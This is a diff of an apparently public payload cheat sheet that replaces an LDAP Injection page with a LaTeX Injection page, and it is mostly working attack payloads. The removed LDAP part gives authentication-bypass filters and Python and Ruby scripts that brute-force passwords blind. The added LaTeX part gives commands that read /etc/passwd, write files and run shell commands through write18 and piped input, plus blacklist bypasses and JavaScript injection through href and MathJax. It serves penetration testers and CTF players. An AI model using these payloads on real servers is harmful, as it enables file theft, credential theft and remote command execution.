@@ -1,174 +1,137 @@
-# LDAP Injection
+# LaTeX Injection
 
-> LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
+> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place.
 
 ## Summary
 
-* [Methodology](#methodology)
-    * [Authentication Bypass](#authentication-bypass)
-    * [Blind Exploitation](#blind-exploitation)
-* [Defaults Attributes](#defaults-attributes)
-* [Exploiting userPassword Attribute](#exploiting-userpassword-attribute)
-* [Scripts](#scripts)
-    * [Discover Valid LDAP Fields](#discover-valid-ldap-fields)
-    * [Special Blind LDAP Injection](#special-blind-ldap-injection)
+* [File Manipulation](#file-manipulation)
+    * [Read File](#read-file)
+    * [Write File](#write-file)
+* [Command Execution](#command-execution)
+* [Cross Site Scripting](#cross-site-scripting)
 * [Labs](#labs)
 * [References](#references)
 
-## Methodology
+## File Manipulation
 
-LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping
+### Read File
 
-### Authentication Bypass
+Attackers can read the content of sensitive files on the server.
 
-Attempt to manipulate the filter logic by injecting always-true conditions.
+Read file and interpret the LaTeX code in it:
 
-**Example 1**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
-
-```sql
-user  = *)(uid=*))(|(uid=*
-pass  = password
-query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
+```tex
+\input{/etc/passwd}
+\include{somefile} # load .tex file (somefile.tex)
 ```
 
-**Example 2**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
+Read single lined file:
 
-```sql
-user  = admin)(!(&(1=0
-pass  = q))
-query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
+```tex
+\newread\file
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file
 ```
 
-### Blind Exploitation
+Read multiple lined file:
 
-This scenario demonstrates LDAP blind exploitation using a technique similar to binary search or character-based brute-forcing to discover sensitive information like passwords. It relies on the fact that LDAP filters respond differently to queries based on whether the conditions match or not, without directly revealing the actual password.
-
-```sql
-(&(sn=administrator)(password=*))    : OK
-(&(sn=administrator)(password=A*))   : KO
-(&(sn=administrator)(password=B*))   : KO
-...
-(&(sn=administrator)(password=M*))   : OK
-(&(sn=administrator)(password=MA*))  : KO
-(&(sn=administrator)(password=MB*))  : KO
-...
-(&(sn=administrator)(password=MY*))  : OK
-(&(sn=administrator)(password=MYA*)) : KO
-(&(sn=administrator)(password=MYB*)) : KO
-(&(sn=administrator)(password=MYC*)) : KO
-...
-(&(sn=administrator)(password=MYK*)) : OK
-(&(sn=administrator)(password=MYKE)) : OK
+```tex
+\lstinputlisting{/etc/passwd}
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+    \read\file to\fileline
+    \text{\fileline}
+\repeat
+\closein\file
 ```
 
-**LDAP Filter Breakdown**:
+Read text file, **without** interpreting the content, it will only paste raw file content:
 
-* `&`: Logical AND operator, meaning all conditions inside must be true.
-* `(sn=administrator)`: Matches entries where the sn (surname) attribute is administrator.
-* `(password=X*)`: Matches entries where the password starts with X (case-sensitive). The asterisk (*) is a wildcard, representing any remaining characters.
-
-## Defaults Attributes
-
-Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
-
-```bash
-userPassword
-surname
-name
-cn
-sn
-objectClass
-mail
-givenName
-commonName
+```tex
+\usepackage{verbatim}
+\verbatiminput{/etc/passwd}
 ```
 
-## Exploiting userPassword Attribute
+If injection point is past document header (`\usepackage` cannot be used), some control
+characters can be deactivated in order to use `\input` on file containing `$`, `#`,
+`_`, `&`, null bytes, ... (eg. perl scripts).
 
-`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
-In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
-
-> octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.
-
-```bash
-userPassword:2.5.13.18:=\xx (\xx is a byte)
-userPassword:2.5.13.18:=\xx\xx
-userPassword:2.5.13.18:=\xx\xx\xx
+```tex
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\input{path_to_script.pl}
 ```
 
-## Scripts
+To bypass a blacklist try to replace one character with it's unicode hex value.
 
-### Discover Valid LDAP Fields
+* ^^41 represents a capital A
+* ^^7e represents a tilde (~) note that the ‘e’ must be lower case
 
-```python
-#!/usr/bin/python3
-import requests
-import string
-
-fields = []
-url = 'https://URL.com/'
-f = open('dic', 'r')
-world = f.read().split('\n')
-f.close()
-
-for i in world:
-    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
-    if 'TRUE CONDITION' in r.text:
-        fields.append(str(i))
-
-print(fields)
+```tex
+\lstin^^70utlisting{/etc/passwd}
 ```
 
-### Special Blind LDAP Injection
+### Write File
 
-```python
-#!/usr/bin/python3
-import requests, string
-alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+Write single lined file:
 
-flag = ""
-for i in range(50):
-    print("[i] Looking for number " + str(i))
-    for char in alphabet:
-        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
-        if ("TRUE CONDITION" in r.text):
-            flag += char
-            print("[+] Flag: " + flag)
-            break
+```tex
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\write\outfile{Line 2}
+\write\outfile{I like trains}
+\closeout\outfile
 ```
 
-Exploitation script by [@noraj](https://github.com/noraj)
+## Command Execution
 
-```ruby
-#!/usr/bin/env ruby
-require 'net/http'
-alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
+The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.
 
-flag = ''
-(0..50).each do |i|
-  puts("[i] Looking for number #{i}")
-  alphabet.each do |char|
-    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
-    if /TRUE CONDITION/.match?(r)
-      flag += char
-      puts("[+] Flag: #{flag}")
-      break
-    end
-  end
-end
+```tex
+\immediate\write18{id > output}
+\input{output}
+```
+
+If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):
+
+```tex
+\immediate\write18{env | base64 > test.tex}
+\input{text.tex}
+```
+
+```tex
+\input|ls|base64
+\input{|"/bin/hostname"}
+```
+
+## Cross Site Scripting
+
+From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
+
+```tex
+\url{javascript:alert(1)}
+\href{javascript:alert(1)}{placeholder}
+```
+
+In [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)
+
+```tex
+\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
 ```
 
 ## Labs
 
-* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
-* [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)
+* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
+* [Root Me - LaTeX - Command Execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)
 
 ## References
 
-* [[European Cyber Week] - AdmYSion - Alan Marrec (Maki) - January 14, 2025](https://web.archive.org/web/20250114083154/https://www.maki.bzh/writeups/ecw2018admyssion/)
-* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://web.archive.org/web/20200924103615/https://0xukn.fr/posts/writeupecw2018admyssion/)
-* [How To Configure OpenLDAP and Perform Administrative LDAP Tasks - Justin Ellingwood - May 30, 2015](https://web.archive.org/web/20260119175101/https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
-* [How To Manage and Use LDAP Servers with OpenLDAP Utilities - Justin Ellingwood - May 29, 2015](https://web.archive.org/web/20160305121823/https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
-* [LDAP Blind Explorer - Alonso Parada - August 12, 2011](https://web.archive.org/web/20160120073444/https://code.google.com/p/ldap-blind-explorer/)
-* [LDAP Injection & Blind LDAP Injection - Chema Alonso, José Parada Gimeno - October 10, 2008](https://web.archive.org/web/20081010181534/http://blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
-* [LDAP Injection Prevention Cheat Sheet - OWASP - July 16, 2019](https://web.archive.org/web/20190719164052/https://www.owasp.org/index.php/LDAP_injection)
+* [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://web.archive.org/web/20260209043241/https://0day.work/hacking-with-latex/)
+* [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://web.archive.org/web/20210117203905/https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
+* [Pwning coworkers thanks to LaTeX - scumjr - November 28, 2016](https://web.archive.org/web/20161130151956/https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
